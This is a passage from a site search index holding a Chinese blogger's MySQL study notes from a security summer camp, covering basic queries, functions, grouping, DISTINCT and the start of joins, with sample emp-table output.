<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ROIS_Summer</title>
    <link href="/2023/07/09/ROIS-Summer/"/>
    <url>/2023/07/09/ROIS-Summer/</url>
    
    <content type="html"><![CDATA[<h1 id="ROIS夏令营"><a href="#ROIS夏令营" class="headerlink" title="ROIS夏令营"></a>ROIS夏令营</h1><hr><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="MySQL学习记录"><a href="#MySQL学习记录" class="headerlink" title="MySQL学习记录"></a>MySQL学习记录</h3><h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>配置环境参考<a href="https://potatowo233.github.io/2023/04/05/docker-note/#Docker-%E9%83%A8%E7%BD%B2-MySQL">docker-note中文章</a></p><p>默认在3306端口运行MySQL服务。</p><p>数据库管理系统：</p><p>用来管理数据库中数据的，对数据增删查改。常见：<code>MySQL、DB2、Oracle</code>等。</p><p><strong>执行MySQL命令时注意以分号结尾，不见分号不执行</strong></p><p><strong>SQL语句不区分大小写</strong></p><p>常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;#查看有哪些数据库<br>use &lt;DB&gt;;#使用某个数据库(自带4个数据库，SQLI注入时与其中某些息息相关，存有数据库表名等等信息)<br>create database &lt;DB&gt;;#创建数据库<br>exit;#退出<br>show tables;#查看某个数据库内的表<br></code></pre></td></tr></table></figure><p>表(<strong>table</strong>)：</p><p>行(row)</p><p>列(字段)(<strong>column</strong>)</p><p>SQL语句：</p><p>DQL：数据查询语言(带SELECT)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT &lt;字段名&gt; FROM &lt;表名&gt;#如果查询多个字段字段间用逗号隔开，查询全部用*或者一个一个字段敲进去，星号效率低，实际开发不建议使用<br>SELECT &lt;字段1&gt;,&lt;字段2&gt;,&lt;字段3&gt;... FROM &lt;表名&gt; WHERE &lt;条件&gt;;#条件中&gt;、&lt;、&gt;=、&lt;=、=不用赘述，between .. and ..介于两者之间(左小右大)、&lt;&gt;或!=不等于、or 或、and 与<br>#同大多数编程语言一样，and优先级高于or，最好用括号明确逻辑层次<br>SELECT<br>...<br>FROM<br>...<br>WHERE<br>...<br>GROUP BY<br>...<br>ORDER  BY<br>...;#关键字顺序不能错<br></code></pre></td></tr></table></figure><p>DML：数据操作语言(对表当中数据增删改)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT#增<br>DELETE#删<br>UPDATE#改<br></code></pre></td></tr></table></figure><p>DDL：数据定义语言(CREATE、DROP、ALTER，主要操作表结构而不是修改数据，如删掉某列，增加新的一个字段、创建、删除表)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE#新建<br>ALTER#修改<br>DROP#删除<br>#不同于DML对表数据的增删改，DDL是对表结构进行操作<br></code></pre></td></tr></table></figure><p>TCL：事务控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">COMMIT#事务提交<br>ROLLBACK#事务回滚<br></code></pre></td></tr></table></figure><p>DCL：数据控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:<br>GRAND#授权<br>REVOKE#撤销权限<br></code></pre></td></tr></table></figure><p>下面用上面学到操作的先制作一个测试用数据库练练手</p><p>先看一下有哪些数据库 <code>show databases;</code>，之前复现题目环境时创建了个flag数据库，正好可以试下删除数据库的操作</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150139318.png"></p><p><code>use flag;</code>进入该数据库，<code>show tables;</code>查看数据库内所有表</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150816476.png"></p><p>浅查一下</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150912146.png"></p><p>查完，删表跑路（bushi</p><p>可以看到我们的test数据库内只有一个flag表，下面删除该表<code>drop table flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709151149295.png"></p><p>使用<code>drop table &lt;表名&gt;;</code>删表，这时候我们再查数据库中的表名，已经是空的了，那一不做二不休，试一下删数据库<code>drop database flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709152945576.png"></p><p>可以看到flag数据库已经被删除了。</p><p>这里先开navicat可视化快速创个数据库然后导出，一会尝试从文件导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709153841466.png"></p><p>导入文件的时候踩了个坑(其实还有个坑，这个坑也是几乎所有编程语言共有的，养成良好习惯从我做起（，路径中憋整中文)</p><p>使用命令<code>source &lt;file_url&gt;;</code>导入sql文件(意外发现其实source命令也可以不需要分号，但是养成好习惯，都加)</p><p>要先选中一个数据库再导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709160434502.png"></p><p>如图所示便导入成功：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709161124060.png"></p><p>查看表结构，不看数据，使用<code>describe &lt;表名&gt;;</code>命令(或者<code>desc &lt;表名&gt;</code>也可)</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709162429614.png"></p><p>然后感觉自己创的表太草率了，找了个更好的数据库导入了（</p><p>下面进行desc查表结构以及使用as关键字对查询字段起别名(注意as只对一个字段生效)(as可省，但是注意别名和真名间不要有逗号)：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709172305350.png"></p><p><strong>起别名不对原表字段名造成影响</strong></p><p><strong>SELECT语句永远无法进行修改操作</strong></p><p><strong>在所有数据库中，字符串是用单引号括起来的，双引号在Oracle中无法使用但是在MySQL中可以，例别名中有空格别名用单引号括起来</strong></p><p>字段可以使用数学表达式：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180029404.png"></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180041731.png"></p><h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p> MySQL中NULL不能用&#x3D;衡量，只能用<code>is/is not</code>，因为数据库中的NULL是表示该位置为空，而不是一个值，是一个属性</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710141543103.png"></p><p>IN关键字(等价于多个or)，取反用not in()：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710143250340.png"></p><p>like(模糊查询，sql注入会使用到)：</p><ul><li>‘%’匹配任意个字符（可理解为正则表达式<code>.*?</code>）；</li><li>‘_’一个下划线只匹配一个字符（可以理解为正则表达式的<code>.</code>）；</li></ul><p>eg：</p><p>查询名字里含有字符’o’的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%o%&#x27;;<br></code></pre></td></tr></table></figure><p>OUTPUT:</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710144012932.png"></p><p>eg：</p><p>以T结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%T&#x27;;<br></code></pre></td></tr></table></figure><p>以K开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;K%&#x27;;<br></code></pre></td></tr></table></figure><p>找出第二个字母是A的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;_A%&#x27;;<br></code></pre></td></tr></table></figure><p>找出含下划线的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%\_%&#x27;;#使用转义字符&#x27;\&#x27;<br></code></pre></td></tr></table></figure><p>order by排序：</p><p><code>order by sal</code>默认升序，指定降序<code>order by sal desc</code>(descend)，指定升序<code>order by sal asc</code>(ascend)</p><p>多字段排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工名字和薪资，要求按照薪资升序，薪资相同按照名字升序<br>select ename,sal from emp order by sal asc,ename asc;#sal在前起主导，sal相等时才比较ename<br></code></pre></td></tr></table></figure><p>根据字段位置排序(sql注入常用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp order by 2;#2表示第二列<br></code></pre></td></tr></table></figure><p><strong>数据处理函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Lower()#转换小写<br>Upper()#转换大写<br>******Substr()#取子串(sub(string,start,length))<br>******Length()#取长度<br>Trim()#去空格<br>str_to_date()#将字符串转化成日期<br>data_format()#格式化日期<br>format()#设置千分位<br>round()#四舍五入，用法：round(待变值，保留小数位)<br>rand()#生成随机数<br>******concat()#字符串拼接，而不能用加号<br>ifnull()#将null赋予值，ifnull(数据，被当做哪个值)，如果数据是null,将数据当做哪个值<br></code></pre></td></tr></table></figure><p><em><strong>substr()起始下标从1开始而不是0！</strong></em></p><p>找出员工名字第一个字母是A的员工信息？</p><p>两种方法：</p><ol><li><code>select ename from emp where ename like &#39;A%&#39;;</code></li><li><code>select ename from emp where substr(ename,1,1)=&#39;A&#39;;</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql"> select ename,sal + comm as salcomm from emp;#数据库中有null参与的数据运算结果都为null<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |    NULL |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  |    NULL |<br>| MARTIN | 2650.00 |<br>| BLAKE  |    NULL |<br>| CLARK  |    NULL |<br>| SCOTT  |    NULL |<br>| KING   |    NULL |<br>| TURNER | 1500.00 |<br>| ADAMS  |    NULL |<br>| JAMES  |    NULL |<br>| FORD   |    NULL |<br>| MILLER |    NULL |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p>ifnull()的用途：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal + ifnull(comm,0) as salcomm from emp;<br>+--------+---------+<br>| ename  | salcomm |<br>+--------+---------+<br>| SMITH  |  800.00 |<br>| ALLEN  | 1900.00 |<br>| WARD   | 1750.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 2650.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure><p><code>case...when...then...when...then...else...end</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:当员工工作岗位是MANAGER时工资上调10%，当员工工作岗位是SALESMAN时工资上调15%，其他正常<br> select ename,job,sal as oldsal,(case job when &#x27;MANAGER&#x27; then sal*1.1 when &#x27;SALESMAN&#x27; then sal*1.5 else sal end) as newsal from emp;<br>+--------+-----------+---------+---------+<br>| ename  | job       | oldsal  | newsal  |<br>+--------+-----------+---------+---------+<br>| SMITH  | CLERK     |  800.00 |  800.00 |<br>| ALLEN  | SALESMAN  | 1600.00 | 2400.00 |<br>| WARD   | SALESMAN  | 1250.00 | 1875.00 |<br>| JONES  | MANAGER   | 2975.00 | 3272.50 |<br>| MARTIN | SALESMAN  | 1250.00 | 1875.00 |<br>| BLAKE  | MANAGER   | 2850.00 | 3135.00 |<br>| CLARK  | MANAGER   | 2450.00 | 2695.00 |<br>| SCOTT  | ANALYST   | 3000.00 | 3000.00 |<br>| KING   | PRESIDENT | 5000.00 | 5000.00 |<br>| TURNER | SALESMAN  | 1500.00 | 2250.00 |<br>| ADAMS  | CLERK     | 1100.00 | 1100.00 |<br>| JAMES  | CLERK     |  950.00 |  950.00 |<br>| FORD   | ANALYST   | 3000.00 | 3000.00 |<br>| MILLER | CLERK     | 1300.00 | 1300.00 |<br>+--------+-----------+---------+---------+<br></code></pre></td></tr></table></figure><h4 id="7-11"><a href="#7-11" class="headerlink" title="7.11"></a>7.11</h4><p> <strong>分组函数：</strong></p><p>输入多行，输出一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">count()#计数，count(*)表示统计所有行数，count(具体字段)代表统计该字段下不为null的<br>sum()#求和<br>avg()#平均值<br>max()#最大值<br>min()#最小值<br></code></pre></td></tr></table></figure><p>分组函数自动忽略null，不需要对null进行处理</p><p>分组函数在使用时必须分组，没分组默认整张表是一组</p><p>分组函数不能直接使用在where语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#表面上没问题<br>ERROR 1111 (HY000): Invalid use of group function<br>#实际报错，无效使用分组函数<br>#为什么？分组查询(group by)<br>#分组函数在使用时必须先分组，但是WHERE语句在执行时排在GROUP BY后面，此时还没分组<br>#为什么select sum(sal) from emp;不用分组也能用呢？<br>#因为执行顺序<br>#from,where,group by,select,order by，select在group by之后执行<br></code></pre></td></tr></table></figure><p><strong>分组查询：(SQL注入常用)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个工作岗位的工资和？<br>#思路：按工作岗位分组，对工资求和<br>select job,sum(sal) from emp group by job;<br>+-----------+----------+<br>| job       | sum(sal) |<br>+-----------+----------+<br>| ANALYST   |  6000.00 |<br>| CLERK     |  4150.00 |<br>| MANAGER   |  8275.00 |<br>| PRESIDENT |  5000.00 |<br>| SALESMAN  |  5600.00 |<br>+-----------+----------+<br></code></pre></td></tr></table></figure><p>在一条SELECT语句中如果有GROUP BY，SELECT后面只能跟参加分组的字段和分组函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal,deptno from emp;#先查一下表，可以看到10部门中最高工资是KING，20部门中最高工资是FORD和SCOTT，30部门中最高工资是BLAKE<br>+--------+---------+--------+<br>| ename  | sal     | deptno |<br>+--------+---------+--------+<br>| SMITH  |  800.00 |     20 |<br>| ALLEN  | 1600.00 |     30 |<br>| WARD   | 1250.00 |     30 |<br>| JONES  | 2975.00 |     20 |<br>| MARTIN | 1250.00 |     30 |<br>| BLAKE  | 2850.00 |     30 |<br>| CLARK  | 2450.00 |     10 |<br>| SCOTT  | 3000.00 |     20 |<br>| KING   | 5000.00 |     10 |<br>| TURNER | 1500.00 |     30 |<br>| ADAMS  | 1100.00 |     20 |<br>| JAMES  |  950.00 |     30 |<br>| FORD   | 3000.00 |     20 |<br>| MILLER | 1300.00 |     10 |<br>+--------+---------+--------+<br>select deptno,max(sal) from emp group by deptno;#查一下每个部门的最高工资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select ename,deptno,max(sal) from emp group by deptno;#select后加上ename<br>+-------+--------+----------+<br>| ename | deptno | max(sal) |<br>+-------+--------+----------+<br>| CLARK |     10 |  5000.00 |<br>| SMITH |     20 |  3000.00 |<br>| ALLEN |     30 |  2850.00 |<br>+-------+--------+----------+<br>#结果可以看到ename和后面的工资部门信息并不对应，ename无意义，并且Oracle中会报错<br>#如果想实现输出预期结果，需要用到表连接<br></code></pre></td></tr></table></figure><p>按多个字段联合分组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#找出每个部门，不同工作岗位的最高薪资<br>select ename,job,sal,deptno from emp order by deptno;#先查询下按部门分组情况，为便于分析，按部门排序<br>+--------+-----------+---------+--------+<br>| ename  | job       | sal     | deptno |<br>+--------+-----------+---------+--------+<br>| MILLER | CLERK     | 1300.00 |     10 |<br>| KING   | PRESIDENT | 5000.00 |     10 |<br>| CLARK  | MANAGER   | 2450.00 |     10 |<br><br><br>| FORD   | ANALYST   | 3000.00 |     20 |<br>| ADAMS  | CLERK     | 1100.00 |     20 |<br>| SCOTT  | ANALYST   | 3000.00 |     20 |<br>| JONES  | MANAGER   | 2975.00 |     20 |<br>| SMITH  | CLERK     |  800.00 |     20 |<br><br><br>| BLAKE  | MANAGER   | 2850.00 |     30 |<br>| MARTIN | SALESMAN  | 1250.00 |     30 |<br>| TURNER | SALESMAN  | 1500.00 |     30 |<br>| WARD   | SALESMAN  | 1250.00 |     30 |<br>| JAMES  | CLERK     |  950.00 |     30 |<br>| ALLEN  | SALESMAN  | 1600.00 |     30 |<br>+--------+-----------+---------+--------+<br><br>select deptno,job,max(sal) from emp group by deptno,job;#联合分组查询<br>+--------+-----------+----------+<br>| deptno | job       | max(sal) |<br>+--------+-----------+----------+<br>|     10 | CLERK     |  1300.00 |<br>|     10 | MANAGER   |  2450.00 |<br>|     10 | PRESIDENT |  5000.00 |<br>|     20 | ANALYST   |  3000.00 |<br>|     20 | CLERK     |  1100.00 |<br>|     20 | MANAGER   |  2975.00 |<br>|     30 | CLERK     |   950.00 |<br>|     30 | MANAGER   |  2850.00 |<br>|     30 | SALESMAN  |  1600.00 |<br>+--------+-----------+----------+<br></code></pre></td></tr></table></figure><p>如果想对分完组之后的数据进一步过滤，不要用WHERE(参考上面的内容)，而应该用HAVING子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个部门最高薪资，要求显示最高薪资大于3000的<br>select deptno,max(sal) from emp group by deptno;#先不考虑要求，查最大薪资<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+--------+----------+<br>select deptno,max(sal) from emp group by deptno having max(sal)&gt;3000;#考虑限制要求<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br>#只有5000被留下来了<br>#having语句要和group by配套使用，不能代替where<br></code></pre></td></tr></table></figure><p>但是上述语句效率相对比较较低，实际上可以这样考虑：</p><p>先将薪资大于3000的用WHERE过滤了，不大于3000的就不进行分组了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select deptno,max(sal) from emp where sal &gt; 3000 group by deptno;<br>+--------+----------+<br>| deptno | max(sal) |<br>+--------+----------+<br>|     10 |  5000.00 |<br>+--------+----------+<br></code></pre></td></tr></table></figure><p>where和having优先选择where，where没办法的再选择having(比如对每个部门平均薪资进行限制的)</p><p><code>distinct</code>关键字：</p><p>把查询结果去除重复记录，注：原表数据不会被修改，只是查询结果去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job from emp;<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| SALESMAN  |<br>| MANAGER   |<br>| SALESMAN  |<br>| MANAGER   |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>| SALESMAN  |<br>| CLERK     |<br>| CLERK     |<br>| ANALYST   |<br>| CLERK     |<br>+-----------+<br>select distinct job from emp;#去重<br>+-----------+<br>| job       |<br>+-----------+<br>| CLERK     |<br>| SALESMAN  |<br>| MANAGER   |<br>| ANALYST   |<br>| PRESIDENT |<br>+-----------+<br></code></pre></td></tr></table></figure><p>distinct只能出现在所有字段的最前方，如果后面有多个字段，则联合去重：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| SALESMAN  |     30 |<br>| CLERK     |     20 |<br>| CLERK     |     30 |<br>| ANALYST   |     20 |<br>| CLERK     |     10 |<br>+-----------+--------+<br>select distinct job,deptno from emp;<br>+-----------+--------+<br>| job       | deptno |<br>+-----------+--------+<br>| CLERK     |     20 |<br>| SALESMAN  |     30 |<br>| MANAGER   |     20 |<br>| MANAGER   |     30 |<br>| MANAGER   |     10 |<br>| ANALYST   |     20 |<br>| PRESIDENT |     10 |<br>| CLERK     |     30 |<br>| CLERK     |     10 |<br>+-----------+--------+<br></code></pre></td></tr></table></figure><p><strong>连接查询：</strong></p><p>笛卡尔积现象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp;#单独查emp表的ename字段<br>+--------+<br>| ename  |<br>+--------+<br>| SMITH  |<br>| ALLEN  |<br>| WARD   |<br>| JONES  |<br>| MARTIN |<br>| BLAKE  |<br>| CLARK  |<br>| SCOTT  |<br>| KING   |<br>| TURNER |<br>| ADAMS  |<br>| JAMES  |<br>| FORD  